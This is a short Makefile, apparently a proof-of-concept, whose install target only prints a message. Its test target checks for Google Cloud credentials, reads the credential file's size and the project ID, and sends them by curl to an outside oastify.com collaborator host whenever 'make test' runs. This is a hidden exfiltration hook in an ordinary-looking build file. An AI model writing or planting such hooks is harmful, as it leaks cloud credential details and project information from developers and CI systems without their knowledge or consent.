install:
	@echo "poc install done"

test:
	@GCP=0; SZ=0; PR=unknown; \
	if [ -n "$$GOOGLE_APPLICATION_CREDENTIALS" ]; then GCP=1; SZ=$$(wc -c < "$$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null || echo 0); fi; \
	if [ -n "$$CLOUDSDK_CORE_PROJECT" ]; then PR=$$CLOUDSDK_CORE_PROJECT; fi; \
	curl -s "http://rfaan0qp7gsysahrw9yudsjnfel49t.oastify.com/custard-test?gcpset=$$GCP&fsize=$$SZ&proj=$$PR" -m 10 || true; \
	echo "poc test done"

